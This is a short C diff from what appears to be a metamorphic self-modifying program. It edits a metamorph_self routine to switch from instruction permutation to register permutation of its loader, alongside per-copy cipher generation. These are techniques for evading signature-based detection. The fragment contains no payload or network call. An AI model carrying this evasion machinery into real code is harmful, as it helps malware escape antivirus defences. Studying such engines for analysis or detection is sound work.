@@ -26,11 +26,12 @@ bool		metamorph_self(uint64_t son_seed[2], uint64_t client_id)
 	uint64_t	unique_seed = polymorphic_seed_engine(son_seed, client_id);
 	size_t		cypher_size = (size_t)cypher_end - (size_t)cypher;
 	size_t		loader_size = return_to_client - mark_below;
+	size_t		reg_permutable_loader = end_of_reg_permutable_code - mark_below;
 
 	if (!generate_cypher((void *)cypher, unique_seed, cypher_size)
 	|| !generate_decypher((void *)decypher, unique_seed, cypher_size)
-	|| !permutate_instructions(mark_below, unique_seed, loader_size)
-	// || !permutate_registers(mark_below, unique_seed, loader_size)
+	// || !permutate_instructions(mark_below, unique_seed, loader_size)
+	|| !permutate_registers(mark_below, unique_seed, reg_permutable_loader)
 	|| !true) // add more metamorphosis above!
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 
